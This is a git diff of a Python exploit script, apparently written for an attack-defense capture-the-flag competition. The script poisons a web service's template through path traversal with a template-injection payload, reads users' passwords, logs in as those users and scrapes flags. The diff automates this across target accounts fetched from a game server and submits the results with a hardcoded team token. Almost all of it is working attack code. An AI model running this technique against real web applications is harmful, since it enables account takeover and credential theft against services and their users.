@@ -2,12 +2,23 @@ import requests
 from requests import session
 import faker
 from bs4 import BeautifulSoup
+import re
+import json
+import sys
+import time
 
+regex = re.compile('[A-Z0-9]{31}=')
 
-url = "http://127.0.0.1:2324"
+url = f"http://{sys.argv[1]}:2324"
 payload = "{{ .guest.Password }}"
 path = "../../templates/department.html"
-victim = "hehehe"
+victim = "victim"
+
+def attack_data():
+    return (json.loads(d) for d in requests.get('http://10.10.10.10/api/client/attack_data/').json().get('archiveSCP', {}).get(sys.argv[1], []))
+
+def send(flag):
+    print(requests.put('http://10.10.10.10/flags', headers={'X-Team-Token': '086bb094f1e93026'}, json=flag).text)
 
 def signup(session: requests.Session, username: str, password: str):
         resp = session.post(f'{url}/register', data={
@@ -30,10 +41,10 @@ def get_list_scp(session):
     links = content_div.find_all('a')
     return links
 
-def get_scp(session, links):
+def get_flag_from_scp(session, links):
     for link in links:
         resp = session.get(url + link["href"])
-        print(resp.text)
+        return regex.findall(resp.text)[0]
     
     
 
@@ -52,10 +63,15 @@ def get_password(name):
     text_after_html_tag = ''.join(tag_html.find_next_siblings(string=True))
     return text_after_html_tag
 
+flags = []
 
-session = requests.session()
-session = signup(session, faker.Faker().name(), faker.Faker().password())
-createDepartment(session, faker.Faker().name())
-set_poison(session)
-session = signin(session, victim, get_password(victim).strip())
-print(get_scp(session, get_list_scp(session)))
+for i in attack_data():
+    session = requests.session()
+    session = signup(session, faker.Faker().name(), faker.Faker().password())
+    createDepartment(session, faker.Faker().name())
+    set_poison(session)
+    session = signin(session, i["username"], get_password(i["username"]).strip())
+    flags.append(get_flag_from_scp(session, get_list_scp(session)))
+
+send(flags)
+# print(attack_data())
